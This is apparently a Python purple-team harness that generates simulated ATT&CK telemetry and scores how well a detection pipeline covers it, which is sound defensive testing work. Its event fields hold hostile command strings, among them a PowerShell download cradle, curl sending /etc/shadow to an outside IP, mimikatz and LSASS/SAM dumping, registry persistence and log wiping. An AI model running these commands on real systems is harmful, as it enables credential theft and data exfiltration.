"""Safe Purple-Team attack simulation harness for MITRE ATT&CK coverage verification.

Safety guarantees:
1. All generated events explicitly set ``raw_metadata['is_simulation'] = True`` and
   ``raw_metadata['simulation_technique'] = <TECHNIQUE_ID>``.
2. No live malicious binaries or payloads are executed.
3. No persistent host modifications outside an ephemeral temp directory
   (which is wiped immediately upon completion).
4. Evaluates pipeline detection, measures coverage score per ATT&CK technique,
   and produces structured gap analysis.
"""

from __future__ import annotations

import logging
import shutil
import tempfile
import uuid
from collections.abc import Callable, Sequence
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from pydantic import BaseModel, ConfigDict, Field

from centralium.agent.config import CentraliumConfig, load_config
from centralium.agent.models import (
    EventType,
    NormalizedEvent,
    PipelineOutcome,
    RiskBand,
    Severity,
)
from centralium.agent.pipeline import Pipeline

log = logging.getLogger("centralium.simulate.purple_team")


# --------------------------------------------------------------------------- models
class TechniqueCoverage(BaseModel):
    """Detection results for a single MITRE ATT&CK technique."""

    model_config = ConfigDict(extra="forbid")

    technique_id: str
    technique_name: str
    tactic: str
    events_generated: int
    events_detected: int
    detected: bool
    detection_sources: list[str] = Field(default_factory=list)
    max_risk_score: float = 0.0
    max_severity: str = "NONE"
    findings_count: int = 0
    findings_titles: list[str] = Field(default_factory=list)
    gaps: list[str] = Field(default_factory=list)


class PurpleTeamReport(BaseModel):
    """Aggregated purple-team emulation report, coverage score, and gap analysis."""

    model_config = ConfigDict(extra="forbid")

    timestamp: datetime = Field(default_factory=lambda: datetime.now(UTC))
    techniques_tested: int
    techniques_detected: int
    coverage_score: float  # 0.0 to 100.0%
    results: list[TechniqueCoverage] = Field(default_factory=list)
    gap_analysis: list[str] = Field(default_factory=list)
    mode: str = "SIMULATION"

    def to_markdown(self) -> str:
        """Render coverage results and gap analysis as Markdown."""
        lines = [
            "# Centralium Purple-Team MITRE ATT&CK Coverage Report",
            f"**Generated:** {self.timestamp.isoformat()}  ",
            (
                f"**Overall Coverage:** {self.coverage_score:.1f}% "
                f"({self.techniques_detected}/{self.techniques_tested} techniques detected)  "
            ),
            "",
            "## Technique Coverage Matrix",
            "",
            "| Technique | Name | Tactic | Generated | Detected | Max Risk | Severity | Status |",
            "|---|---|---|---|---|---|---|---|",
        ]

        for r in self.results:
            status = "✅ PASS" if r.detected else "❌ GAP"
            lines.append(
                f"| `{r.technique_id}` | {r.technique_name} | {r.tactic} | {r.events_generated} | "
                f"{r.events_detected} | {r.max_risk_score:.1f} | {r.max_severity} | {status} |"
            )

        lines.extend(
            [
                "",
                "## Findings by Technique",
                "",
            ]
        )
        for r in self.results:
            if r.detected:
                src_str = ", ".join(r.detection_sources) or "Rules/Heuristics"
                titles = "; ".join(r.findings_titles[:3])
                lines.append(
                    f"- **{r.technique_id} ({r.technique_name})**: Detected via [{src_str}] — *{titles}*"
                )

        lines.extend(
            [
                "",
                "## Gap Analysis & Remediation",
                "",
            ]
        )
        if self.gap_analysis:
            for gap in self.gap_analysis:
                lines.append(f"- ⚠️ {gap}")
        else:
            lines.append("- ✨ No detection gaps identified among tested techniques.")

        return "\n".join(lines)

    def to_json(self) -> str:
        return self.model_dump_json(indent=2)


# --------------------------------------------------------------------------- scenario catalog
class TechniqueScenario:
    """Defines how to safely generate synthetic telemetry for a specific ATT&CK technique."""

    def __init__(
        self,
        technique_id: str,
        name: str,
        tactic: str,
        generator: Callable[[Path], list[NormalizedEvent]],
    ) -> None:
        self.technique_id = technique_id
        self.name = name
        self.tactic = tactic
        self.generator = generator


def _make_sim_event(
    event_type: EventType,
    technique_id: str,
    *,
    process_name: str | None = None,
    executable_path: str | None = None,
    command_line: str | None = None,
    parent_process: str | None = None,
    destination_ip: str | None = None,
    destination_port: int | None = None,
    protocol: str | None = None,
    file_path: str | None = None,
    user: str = "simulation_user",
    pid: int = 98765,
    extra_meta: dict[str, Any] | None = None,
) -> NormalizedEvent:
    meta = {
        "is_simulation": True,
        "simulation_technique": technique_id,
        "simulation_id": str(uuid.uuid4())[:8],
    }
    if extra_meta:
        meta.update(extra_meta)

    return NormalizedEvent(
        event_id=f"sim-{uuid.uuid4().hex[:12]}",
        timestamp=datetime.now(UTC),
        event_type=event_type,
        host_id="sim-host",
        pid=pid,
        process_name=process_name,
        executable_path=executable_path,
        command_line=command_line,
        parent_process=parent_process,
        destination_ip=destination_ip,
        destination_port=destination_port,
        protocol=protocol,
        file_path=file_path,
        user=user,
        raw_metadata=meta,
    )


def _catalog() -> dict[str, TechniqueScenario]:
    """Catalog of safe ATT&CK technique generators."""

    def gen_t1059_001(_temp_dir: Path) -> list[NormalizedEvent]:
        # PowerShell encoded download cradle (T1059.001)
        encoded_arg = "-Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="
        return [
            _make_sim_event(
                EventType.PROCESS_START,
                "T1059.001",
                process_name="powershell.exe",
                executable_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                command_line=f"powershell.exe -NoP -NonI -W Hidden {encoded_arg}",
                parent_process="cmd.exe",
            ),
            _make_sim_event(
                EventType.PROCESS_START,
                "T1059.001",
                process_name="powershell.exe",
                executable_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                command_line="powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')",
                parent_process="explorer.exe",
            ),
        ]

    def gen_t1059_003(_temp_dir: Path) -> list[NormalizedEvent]:
        # Windows Command Shell reconnaissance (T1059.003)
        return [
            _make_sim_event(
                EventType.PROCESS_START,
                "T1059.003",
                process_name="cmd.exe",
                executable_path="C:\\Windows\\System32\\cmd.exe",
                command_line="cmd.exe /c whoami /all & net user & net localgroup administrators",
                parent_process="explorer.exe",
            )
        ]

    def gen_t1059_004(_temp_dir: Path) -> list[NormalizedEvent]:
        # Unix Shell suspicious one-liner (T1059.004)
        return [
            _make_sim_event(
                EventType.PROCESS_START,
                "T1059.004",
                process_name="bash",
                executable_path="/bin/bash",
                command_line="bash -c 'id; uname -a; cat /etc/passwd'",
                parent_process="sshd",
            )
        ]

    def gen_t1003_001(temp_dir: Path) -> list[NormalizedEvent]:
        # OS Credential Dumping: LSASS (T1003.001)
        dump_file = str(temp_dir / "lsass.dmp")
        return [
            _make_sim_event(
                EventType.PROCESS_START,
                "T1003.001",
                process_name="procdump.exe",
                executable_path="C:\\Windows\\Temp\\procdump.exe",
                command_line=f"procdump.exe -ma lsass.exe {dump_file}",
                parent_process="cmd.exe",
            ),
            _make_sim_event(
                EventType.PROCESS_START,
                "T1003.001",
                process_name="rundll32.exe",
                executable_path="C:\\Windows\\System32\\rundll32.exe",
                command_line=(
                    "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full"
                ),
                parent_process="cmd.exe",
            ),
            _make_sim_event(
                EventType.PROCESS_START,
                "T1003.001",
                process_name="mimikatz.exe",
                executable_path="C:\\Temp\\mimikatz.exe",
                command_line='mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
                parent_process="cmd.exe",
            ),
        ]

    def gen_t1003_002(temp_dir: Path) -> list[NormalizedEvent]:
        # OS Credential Dumping: SAM (T1003.002)
        sam_file = str(temp_dir / "sam.save")
        return [
            _make_sim_event(
                EventType.PROCESS_START,
                "T1003.002",
                process_name="reg.exe",
                executable_path="C:\\Windows\\System32\\reg.exe",
                command_line=f"reg.exe save HKLM\\SAM {sam_file}",
                parent_process="cmd.exe",
            )
        ]

    def gen_t1071_001(_temp_dir: Path) -> list[NormalizedEvent]:
        # C2 Web Protocols on suspicious port (T1071.001)
        return [
            _make_sim_event(
                EventType.NETWORK_CONNECT,
                "T1071.001",
                process_name="powershell.exe",
                executable_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                destination_ip="203.0.113.50",
                destination_port=4444,
                protocol="tcp",
            ),
            _make_sim_event(
                EventType.NETWORK_CONNECT,
                "T1071.001",
                process_name="curl",
                executable_path="/usr/bin/curl",
                destination_ip="198.51.100.22",
                destination_port=1337,
                protocol="tcp",
            ),
        ]

    def gen_t1486(temp_dir: Path) -> list[NormalizedEvent]:
        # Ransomware encryption / file rename (T1486)
        events = []
        for i in range(5):
            fpath = str(temp_dir / f"document_{i}.docx.locked")
            events.append(
                _make_sim_event(
                    EventType.FILE_RENAME,
                    "T1486",
                    process_name="encryptor.exe",
                    executable_path="C:\\Temp\\encryptor.exe",
                    file_path=fpath,
                    extra_meta={"entropy": 7.95, "high_entropy": True},
                )
            )
        return events

    def gen_t1547_001(_temp_dir: Path) -> list[NormalizedEvent]:
        # Registry Run Key Persistence (T1547.001)
        run_cmd = (
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v Updater /t REG_SZ /d "C:\\Users\\Public\\mal.exe" /f'
        )
        return [
            _make_sim_event(
                EventType.PROCESS_START,
                "T1547.001",
                process_name="reg.exe",
                executable_path="C:\\Windows\\System32\\reg.exe",
                command_line=run_cmd,
                parent_process="cmd.exe",
            )
        ]

    def gen_t1543_002(temp_dir: Path) -> list[NormalizedEvent]:
        # Systemd Service Creation Persistence (T1543.002)
        unit_file = str(temp_dir / "backdoor.service")
        return [
            _make_sim_event(
                EventType.FILE_CREATE,
                "T1543.002",
                process_name="cp",
                file_path=unit_file,
                parent_process="bash",
            ),
            _make_sim_event(
                EventType.PROCESS_START,
                "T1543.002",
                process_name="systemctl",
                executable_path="/bin/systemctl",
                command_line="systemctl enable backdoor.service",
                parent_process="bash",
            ),
        ]

    def gen_t1021_002(_temp_dir: Path) -> list[NormalizedEvent]:
        # Lateral Movement: SMB (T1021.002)
        return [
            _make_sim_event(
                EventType.NETWORK_CONNECT,
                "T1021.002",
                process_name="cmd.exe",
                executable_path="C:\\Windows\\System32\\cmd.exe",
                destination_ip="10.0.0.15",
                destination_port=445,
                protocol="tcp",
                command_line="net use \\\\10.0.0.15\\C$ /user:admin P@ssword123",
            )
        ]

    def gen_t1082(_temp_dir: Path) -> list[NormalizedEvent]:
        # System Information Discovery (T1082)
        return [
            _make_sim_event(
                EventType.PROCESS_START,
                "T1082",
                process_name="systeminfo.exe",
                executable_path="C:\\Windows\\System32\\systeminfo.exe",
                command_line="systeminfo.exe",
                parent_process="cmd.exe",
            )
        ]

    def gen_t1048_003(_temp_dir: Path) -> list[NormalizedEvent]:
        # Exfiltration Over Alternative Protocol (T1048.003)
        return [
            _make_sim_event(
                EventType.PROCESS_START,
                "T1048.003",
                process_name="curl",
                executable_path="/usr/bin/curl",
                command_line="curl -F file=@/etc/shadow http://198.51.100.99:8080/upload",
                parent_process="bash",
            ),
            _make_sim_event(
                EventType.NETWORK_CONNECT,
                "T1048.003",
                process_name="curl",
                executable_path="/usr/bin/curl",
                destination_ip="198.51.100.99",
                destination_port=8080,
                protocol="tcp",
            ),
        ]

    def gen_t1070_004(_temp_dir: Path) -> list[NormalizedEvent]:
        # Indicator Removal: File Deletion (T1070.004)
        return [
            _make_sim_event(
                EventType.PROCESS_START,
                "T1070.004",
                process_name="srm",
                executable_path="/usr/bin/srm",
                command_line="srm -f /var/log/auth.log",
                parent_process="bash",
            )
        ]

    def gen_t1055(_temp_dir: Path) -> list[NormalizedEvent]:
        # Process Injection (T1055)
        return [
            _make_sim_event(
                EventType.PROCESS_START,
                "T1055",
                process_name="gdb",
                executable_path="/usr/bin/gdb",
                command_line="gdb -p 1234 --batch -ex 'call (void)system(\"malicious\")'",
                parent_process="bash",
            )
        ]

    def gen_t1036_005(temp_dir: Path) -> list[NormalizedEvent]:
        # Masquerading: svchost in temp (T1036.005)
        fake_path = str(temp_dir / "svchost.exe")
        return [
            _make_sim_event(
                EventType.PROCESS_START,
                "T1036.005",
                process_name="svchost.exe",
                executable_path=fake_path,
                command_line=f"{fake_path} -k netsvcs",
                parent_process="explorer.exe",
            )
        ]

    return {
        "T1059.001": TechniqueScenario("T1059.001", "PowerShell", "Execution", gen_t1059_001),
        "T1059.003": TechniqueScenario("T1059.003", "Windows Command Shell", "Execution", gen_t1059_003),
        "T1059.004": TechniqueScenario("T1059.004", "Unix Shell", "Execution", gen_t1059_004),
        "T1003.001": TechniqueScenario("T1003.001", "LSASS Dumping", "Credential Access", gen_t1003_001),
        "T1003.002": TechniqueScenario("T1003.002", "SAM Dumping", "Credential Access", gen_t1003_002),
        "T1071.001": TechniqueScenario("T1071.001", "Web Protocols C2", "Command and Control", gen_t1071_001),
        "T1486": TechniqueScenario("T1486", "Data Encrypted (Ransomware)", "Impact", gen_t1486),
        "T1547.001": TechniqueScenario("T1547.001", "Registry Run Keys", "Persistence", gen_t1547_001),
        "T1543.002": TechniqueScenario("T1543.002", "Systemd Service Creation", "Persistence", gen_t1543_002),
        "T1021.002": TechniqueScenario("T1021.002", "SMB / Admin Shares", "Lateral Movement", gen_t1021_002),
        "T1082": TechniqueScenario("T1082", "System Discovery", "Discovery", gen_t1082),
        "T1048.003": TechniqueScenario(
            "T1048.003", "Exfiltration Over Non-C2 Protocol", "Exfiltration", gen_t1048_003
        ),
        "T1070.004": TechniqueScenario("T1070.004", "Indicator Removal", "Defense Evasion", gen_t1070_004),
        "T1055": TechniqueScenario("T1055", "Process Injection", "Defense Evasion", gen_t1055),
        "T1036.005": TechniqueScenario("T1036.005", "Masquerading", "Defense Evasion", gen_t1036_005),
    }


# --------------------------------------------------------------------------- simulator engine
class PurpleTeamSimulator:
    """Safe purple-team emulation runner and detection coverage analyzer."""

    def __init__(
        self,
        pipeline: Pipeline | None = None,
        config: CentraliumConfig | None = None,
    ) -> None:
        self.config = config or load_config(demo_mode=True, test_mode=True)
        self.pipeline = pipeline or self._build_pipeline(self.config)
        self.catalog = _catalog()

    def _build_pipeline(self, cfg: CentraliumConfig) -> Pipeline:
        from centralium.agent.runtime import build_runtime

        rt = build_runtime(cfg)
        return rt.pipeline

    def run(
        self,
        techniques: Sequence[str] | None = None,
    ) -> PurpleTeamReport:
        """Run simulated telemetry for specified techniques (or all if None)."""
        temp_dir = Path(tempfile.mkdtemp(prefix="centralium_purple_team_"))
        try:
            target_ids = list(self.catalog.keys())
            if techniques and techniques != ["all"]:
                selected = [t.strip().upper() for t in techniques if t.strip()]
                target_ids = [tid for tid in target_ids if tid in selected]

            results: list[TechniqueCoverage] = []
            gaps: list[str] = []

            for tid in target_ids:
                scenario = self.catalog[tid]
                cov = self._test_technique(scenario, temp_dir)
                results.append(cov)
                if not cov.detected:
                    gap_msg = (
                        f"Technique {cov.technique_id} ({cov.technique_name}, Tactic: {cov.tactic}) "
                        f"was NOT detected. Generated {cov.events_generated} event(s), "
                        f"max risk: {cov.max_risk_score:.1f}. "
                        f"Recommended: author Sigma or behavioral rule for {cov.technique_id}."
                    )
                    gaps.append(gap_msg)

            detected_count = sum(1 for r in results if r.detected)
            total_count = len(results)
            cov_score = (detected_count / total_count * 100.0) if total_count > 0 else 0.0

            return PurpleTeamReport(
                techniques_tested=total_count,
                techniques_detected=detected_count,
                coverage_score=round(cov_score, 1),
                results=results,
                gap_analysis=gaps,
            )
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    def _test_technique(self, scenario: TechniqueScenario, temp_dir: Path) -> TechniqueCoverage:
        events = scenario.generator(temp_dir)
        detected_events = 0
        max_risk = 0.0
        max_sev = Severity.INFO
        all_sources: set[str] = set()
        findings_titles: list[str] = []

        for ev in events:
            outcome: PipelineOutcome = self.pipeline.process(ev)
            if outcome.risk:
                risk = outcome.risk.final_score
                if risk > max_risk:
                    max_risk = risk

            if outcome.findings:
                detected_events += 1
                for f in outcome.findings:
                    all_sources.add(f.source.value)
                    findings_titles.append(f.title)
                    if f.severity.value > max_sev.value:
                        max_sev = f.severity

            elif outcome.risk and outcome.risk.band in (RiskBand.MEDIUM, RiskBand.HIGH, RiskBand.CRITICAL):
                detected_events += 1
                all_sources.add("RISK_ENGINE")

        is_detected = detected_events > 0 or max_risk >= 40.0

        return TechniqueCoverage(
            technique_id=scenario.technique_id,
            technique_name=scenario.name,
            tactic=scenario.tactic,
            events_generated=len(events),
            events_detected=detected_events,
            detected=is_detected,
            detection_sources=sorted(all_sources),
            max_risk_score=round(max_risk, 1),
            max_severity=max_sev.name,
            findings_count=len(findings_titles),
            findings_titles=findings_titles,
            gaps=[] if is_detected else [f"Zero findings generated for {scenario.technique_id}"],
        )


def run_purple_team_simulation(
    techniques: Sequence[str] | None = None,
    config: CentraliumConfig | None = None,
) -> PurpleTeamReport:
    """Convenience helper to initialize simulator and execute test suite."""
    sim = PurpleTeamSimulator(config=config)
    return sim.run(techniques)


__all__ = [
    "PurpleTeamReport",
    "PurpleTeamSimulator",
    "TechniqueCoverage",
    "run_purple_team_simulation",
]
